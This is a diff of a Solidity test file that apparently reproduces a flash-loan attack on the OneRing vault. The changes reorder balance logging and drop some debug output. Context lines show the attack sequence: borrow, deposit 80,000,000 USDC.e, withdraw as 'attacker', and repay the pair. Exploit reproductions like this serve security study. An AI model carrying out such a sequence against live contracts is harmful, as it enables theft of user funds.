@@ -148,19 +148,6 @@ contract OneRingTest is Test, BlockLoader {
             vault.decimals()
         );
         emit log_string("");
-        emit log_string("Vault Balances: ");
-        queryERC20BalanceDecimals(
-            address(usdce),
-            address(vault),
-            usdce.decimals()
-        );
-        queryERC20BalanceDecimals(address(mim), address(vault), mim.decimals());
-        queryERC20BalanceDecimals(
-            address(vault),
-            address(vault),
-            vault.decimals()
-        );
-        emit log_string("");
         emit log_string("Strategy Balances: ");
         queryERC20BalanceDecimals(
             address(usdce),
@@ -175,6 +162,19 @@ contract OneRingTest is Test, BlockLoader {
         queryERC20BalanceDecimals(
             address(vault),
             address(strategy),
+            vault.decimals()
+        );
+        emit log_string("");
+        emit log_string("Vault Balances: ");
+        queryERC20BalanceDecimals(
+            address(usdce),
+            address(vault),
+            usdce.decimals()
+        );
+        queryERC20BalanceDecimals(address(mim), address(vault), mim.decimals());
+        queryERC20BalanceDecimals(
+            address(vault),
+            address(vault),
             vault.decimals()
         );
         emit log_string("");
@@ -300,9 +300,6 @@ contract OneRingTest is Test, BlockLoader {
         printBalance("After step0 ");
         deposit_vault_usdce_vault(80000000e6);
         printBalance("After step1 ");
-        emit log_named_uint("getSharePrice2", vault.getSharePrice());
-        emit log_named_uint("investedBalanceInUSD", strategy.investedBalanceInUSD());
-        emit log_named_uint("totalSupply", vault.totalSupply());
         withdraw_vault_vault_usdce(vault.balanceOf(attacker));
         printBalance("After step2 ");
         payback_usdce_pair((80000000e6 * 1003) / 1000);
